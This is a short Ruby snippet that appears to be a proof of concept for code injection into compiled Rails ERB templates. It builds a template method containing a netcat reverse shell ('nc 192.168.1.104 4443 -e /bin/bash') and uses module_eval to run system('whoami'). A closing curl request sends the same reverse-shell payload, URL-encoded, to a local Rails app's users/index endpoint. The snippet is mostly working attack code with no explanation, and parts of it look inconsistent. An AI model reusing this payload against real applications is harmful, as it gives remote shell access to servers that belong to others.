netcat = '          def _app_views_users__unsafe_html_erb___2814227942932613306_70032701656460(local_assigns, output_buffer)
_old_virtual_path, @virtual_path = @virtual_path, "users/_unsafe";_old_output_buffer = @output_buffer;action = action = local_assigns[:action];controller = controller = local_assigns[:controller];system(\'nc 192.168.1.104 4443 -e /bin/bash\')
# = system(\'nc 192.168.1.104 4443 -e /bin/bash\')
# = local_assigns[:system(\'nc 192.168.1.104 4443 -e /bin/bash\')
#];;@output_buffer = output_buffer || ActionView::OutputBuffer.new;@output_buffer.safe_append=\'correkthorse\'.freeze;@output_buffer.to_s
ensure
@virtual_path, @output_buffer = _old_virtual_path, _old_output_buffer
end
'


#https://apidock.com/ruby/Module/module_eval


source = "def test
  system(\'whoami\')
  #
end"

class Thing
end

Thing.module_eval(source)
Thing.new.test

puts Thing.new._app_views_users__unsafe_html_erb__242640785170445879_70148765187920({},String.new)


curl "localhost:3000/users/index?system(%27nc+192.168.1.104+4443+-e+/bin/bash%27)%0A%23"
